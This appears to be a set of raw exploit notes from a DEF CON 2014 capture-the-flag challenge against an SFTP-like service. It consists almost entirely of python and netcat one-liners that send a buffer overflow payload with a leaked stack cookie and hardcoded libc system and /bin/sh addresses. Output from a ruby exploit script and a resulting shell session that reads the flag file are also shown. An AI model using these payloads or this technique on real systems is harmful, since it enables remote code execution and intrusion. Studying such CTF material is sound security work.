libc start main+9 0xb75773e9

SIZE"A"*44+"\x37"+"A"*868+"0000"+"x"*12+"BBBBCCCCDDDD"

(python -c'print"PASS defcon2014\nKILL ./freetime\nSTOR APP ./freetime\nSIZE 0\nLIST V ./\n"';cat;python -c'print"STOR APP ./freetime\nSIZE 46\n"+"a"*44+"\x2c"+"\x06"+"LIST V ./"')|nc localhost 11115
(python -c'print"PASS defcon2014\nKILL ./freetime\nSTOR APP ./freetime\nSIZE 0\nLIST V ./\n"';cat;python -c'print"STOR APP ./freetime\nSIZE 941\n"+"a"*44+"\x37"+"A"*868+"\x00\xcf\x8c\xa2"+"x"*12+"\xb0\x93\xe9\xf7CCCC\xa4\xa5\x70\xf7"+"LIST V ./"')|nc sftp_bf28442aa4ab1a4089ddca16729b29ac.2014.shallweplayaga.me 115

[*] stack cookie : A28CCF00
[*] system : F75E93B0
[*] /bin/sh : F770A5A4

wuninsu@ubuntu:~/sftp$ ruby exploit.rb
+LegitimateBusinessSyndicate SFTP Service! Logged in
"0"
[*] First chance

[*] stack cookie : 5452B700
[*] system : F76103B0
[*] /bin/sh : F77315A4
(python -c'print"PASS defcon2014\nKILL ./freetime\nSTOR APP ./freetime\nSIZE 0\nLIST V ./\n"';cat;python -c'print"STOR APP ./freetime\nSIZE 941\n"+"a"*44+"\x37"+"A"*868+"\x00\xB7\x52\x54"+"x"*12+"\xB0\x03\x61\xF7CCCC\xA4\x15\x73\xF7"+"LIST V ./"')|nc sftp_bf28442aa4ab1a4089ddca16729b29ac.2014.shallweplayaga.me 115
[*] Delete file

"0"
[*] Change file

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa?p AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?AAAAAA·RTxxxxxxxxxxxx°a?CCC¤s?

id
uid=1001(sftp) gid=1001(sftp) groups=1001(sftp)
cat /home/sftp/flag
The flag is: z0mgs0fuckings1mpl3

